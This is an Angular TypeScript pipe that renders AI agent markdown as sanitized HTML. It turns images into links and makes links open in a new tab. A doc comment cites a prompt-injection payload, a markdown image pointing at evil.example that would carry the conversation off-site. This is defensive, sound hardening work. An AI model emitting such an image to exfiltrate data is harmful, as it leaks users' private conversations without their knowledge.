import { Pipe, PipeTransform, inject, SecurityContext, DOCUMENT } from '@angular/core';
import { DomSanitizer } from '@angular/platform-browser';
import { marked } from 'marked';

/**
 * Renders agent markdown to sanitized HTML.
 *
 * Pure, so Angular only re-runs it when the accumulated content string actually
 * changes — one parse per token rather than one per change detection cycle.
 */
@Pipe({
    name: 'markdown',
    standalone: true
})
export class MarkdownPipe implements PipeTransform {
    private readonly sanitizer = inject(DomSanitizer);
    private readonly document = inject(DOCUMENT);

    transform(value: string): string {
        if (!value) return '';
        const raw = marked.parse(value, { async: false, breaks: true, gfm: true }) as string;
        const safe = this.sanitizer.sanitize(SecurityContext.HTML, raw) ?? '';
        return this.harden(safe);
    }

    /**
     * Post-processes the sanitized HTML on the parsed DOM rather than with a
     * regex, so raw tags the model writes itself are caught too.
     *
     * - Images become links. An image loads the moment the answer renders, so
     *   a prompt-injected `![](https://evil.example/?q=<conversation>)` would
     *   send data off-site with no click. A link only goes anywhere if the
     *   user chooses to follow it.
     * - Links open in a new tab. The conversation lives only in memory, so a
     *   link that navigates this tab away throws it away. `target` and `rel`
     *   are both on Angular's sanitizer allowlist, so they survive the
     *   `[innerHTML]` binding.
     */
    private harden(html: string): string {
        if (!html.includes('<a') && !html.includes('<img')) return html;

        // <template> content is inert: nothing in it loads or runs.
        const template = this.document.createElement('template');
        template.innerHTML = html;
        const content = template.content;

        for (const image of Array.from(content.querySelectorAll('img'))) {
            image.replaceWith(this.imageToLink(image));
        }
        for (const link of Array.from(content.querySelectorAll('a[href]'))) {
            link.setAttribute('target', '_blank');
            link.setAttribute('rel', 'noopener noreferrer');
        }
        return template.innerHTML;
    }

    /** A link to the image's source, labelled with its alt text; plain text if there is no usable source. */
    private imageToLink(image: HTMLImageElement): Node {
        const label = image.getAttribute('alt')?.trim() || 'Image';
        const src = image.getAttribute('src') ?? '';
        if (!/^https?:\/\//i.test(src)) return this.document.createTextNode(label);

        const link = this.document.createElement('a');
        link.setAttribute('href', src);
        link.textContent = label;
        return link;
    }
}
